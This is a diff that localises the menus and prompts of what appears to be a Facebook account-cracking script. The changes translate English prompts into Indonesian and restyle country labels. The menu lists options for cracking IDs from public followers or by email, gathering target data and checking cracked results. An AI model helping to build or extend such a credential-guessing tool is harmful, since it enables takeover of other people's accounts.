@@ -311,22 +311,22 @@ def menu():
     ip = requests.get("https://api.ipify.org").text
     ngr = open('country.txt', 'r').read()
     if "id" in ngr:
-        negara = "Indonesia"
+        negara = "INDONESIA"
     elif "bd" in ngr:
-        negara = "Prindapan/India"
+        negara = "INDIA"
     elif "pk" in ngr:
-        negara = "Pakistan"
+        negara = "PAKISTAN"
     elif "us" in ngr:
-        negara = "USA"
+        negara = "AMERIKA"
     elif " " in ngr:
-        negara = "None"
+        negara = "NONE"
     os.system("clear")
     banner()
     print((k+"\n[ "+p+"Selamat Datang "+a["name"]+k+" ]"+p))
     print((k+"\n["+p+"*."+k+"]"+p+" Id pengguna  : "+id))
     print((k+"["+p+"*."+k+"]"+p+" IP address.  : "+ip))
     print((k+"["+p+"*."+k+"]"+p+" Status       : "+o+"Premium"+b))
-    print((k+"["+p+"*."+k+"]"+p+" Join         : "+durasi))
+    print((k+"["+p+"*."+k+"]"+p+" Join         : \x1b[0;33m"+durasi))
     print((k+"["+p+"*."+k+"]"+p+" Crack        : "+negara))
     print((k+"\n["+p+"01"+k+"]"+p+". \x1b[0;33mCrack ID Dari Publik/Followers"))
     print((k+"["+p+"02"+k+"]"+p+". \x1b[0;33mCrack ID Dari Followers"))
@@ -335,14 +335,14 @@ def menu():
     print((k+"["+p+"05"+k+"]"+p+". \x1b[0;33mCrack Melalui Email"))
     print((k+"["+p+"06"+k+"]"+p+". \x1b[0;33mAmbil Data Target"))
     print((k+"["+p+"07"+k+"]"+p+". \x1b[0;33mCheck Hasil Crack"))
-    print((k+"["+p+"08"+k+"]"+p+". \x1b[0;33mGanti User Agent"))
+    print((k+"["+p+"08"+k+"]"+p+". \x1b[0;33mSetings User Agent"))
     print((k+"["+p+"00"+k+"]"+p+". \x1b[0;31mLog Out"))
     choose_menu()
 
 def choose_menu():
 	r=input(k+"\n"+p+""+k+""+p+"  Pilih : \x1b[0;33m")
 	if r=="":
-		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
+		print((k+"["+p+"!"+k+"]"+p+" Pilih Asww Jan Kosong"))
 		menu()
 	elif r=="1":
 		publik()
@@ -813,7 +813,7 @@ class crack:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -900,7 +900,7 @@ class crackttl:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : \x1b[0;33m")
+			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : \x1b[0;33m")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -1090,7 +1090,7 @@ class bapi:
   def krah(self,isifile):
     print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+" Choose : \x1b[0;33m")
+      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : \x1b[0;33m")
       if f in[""," "]:
         print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
         continue
@@ -1200,7 +1200,7 @@ class bapittl:
   def krah(self,isifile):
     print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+"Choose : \x1b[0;33m")
+      f=input(k+"["+p+"•"+k+"]"+p+"Pilih : \x1b[0;33m")
       if f in[""," "]:
         print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
         continue
